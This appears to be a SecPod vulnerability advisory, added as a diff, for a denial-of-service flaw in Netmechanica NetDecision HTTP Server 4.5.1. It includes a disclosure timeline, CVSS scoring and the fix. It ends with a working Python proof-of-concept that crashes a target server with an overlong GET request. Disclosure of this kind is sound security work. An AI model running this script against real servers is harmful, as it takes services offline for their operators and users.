@@ -1,0 +1,148 @@
+##############################################################################
+#
+# Title    : Netmechanica NetDecision HTTP Server Denial Of Service  
+#            Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netmechanica.com
+# Advisory : http://secpod.org/blog/?p=484
+#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt
+#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py
+# Software : Netmechanica NetDecision HTTP Server version 4.5.1
+# Date     : 05/12/2011
+#
+###############################################################################
+
+SecPod ID: 1040     				05/12/2011 Issue Discovered
+						21/02/2012 Vendor Notified
+						22/02/2012 Vendor Acknowledge
+						24/02/2012 Issue Resolved
+
+
+Class: Denial Of Service			Severity: Medium
+
+
+Overview:
+---------
+Netmechanica NetDecision HTTP Server version 4.5.1 is prone to a denial of 
+service vulnerability.
+
+
+Technical Description:
+----------------------
+The vulnerability is caused due to improper validation of long malicious HTTP
+request to web server, which allows remote attackers to crash the service.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to cause denial of service 
+condition.
+
+
+Affected Software:
+------------------
+Netmechanica NetDecision 4.5.1 (full package) containing HTTP Server version
+4.5.1
+
+
+Tested on:
+-----------
+Netmechanica NetDecision 4.5.1 (full package) containing HTTP Server version
+4.5.1 on Windows XP SP3 & Win XP2. Older versions might be affected.
+Older versions might be affected.
+
+
+References:
+-----------
+http://secpod.org/blog/?p=484
+http://www.netmechanica.com/downloads
+http://www.netmechanica.com/news/?news_id=26
+
+
+Proof of Concept:
+----------------
+http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py
+
+
+Vendor URL:
+----------------
+http://www.netmechanica.com
+http://www.netmechanica.com/news/?news_id=26
+
+
+Solution:
+----------
+Upgrade to NetDecision 4.6.1
+
+
+Risk Factor:
+-------------
+    CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NOT_REQUIRED
+        CONFIDENTIALITY_IMPACT = NONE
+        INTEGRITY_IMPACT       = NONE
+        AVAILABILITY_IMPACT    = PARTIAL
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 5 (AV:N/AC:L/Au:N/C:N/I:N/A:P)
+        Risk factor            = Medium
+
+
+Credits:
+--------
+Prabhu S Angadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
+
+
+#!/usr/bin/python
+##############################################################################
+#
+# Title    : Netmechanica NetDecision HTTP Server Denial Of Service  
+#            Vulnerability
+# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.netmechanica.com
+# Advisory : http://secpod.org/blog/?p=484
+#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt
+#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py
+# Software : Netmechanica NetDecision HTTP Server version 4.5.1
+# Date     : 05/12/2011
+#
+###############################################################################
+
+import socket,sys,time
+
+
+if len(sys.argv) < 2:
+        print "\t[-] Usage: python SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py target_ip"
+        print "\t[-] Example : python SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py 127.0.0.1"
+        print "\t[-] Exiting..."
+        sys.exit(0)
+
+port   = 80
+target = sys.argv[1]
+
+try:
+    socket.inet_aton(target)
+except socket.error:
+    print "Invalid IP address found ..."
+    sys.exit(1)
+
+try:
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.connect((target,port))
+except:
+    print "socket() failed: Server is not running"
+    sys.exit(1)
+
+exploit = "GET "+ "A"*1276 + "\r\n" + "\r\n"
+
+print "HTTP GET request with long filename triggers the vulnerability"
+data = exploit
+sock.sendto(data, (target, port))
+time.sleep(5)
+print "[+] Please verify the server daemon port, it must be down...."
+
+
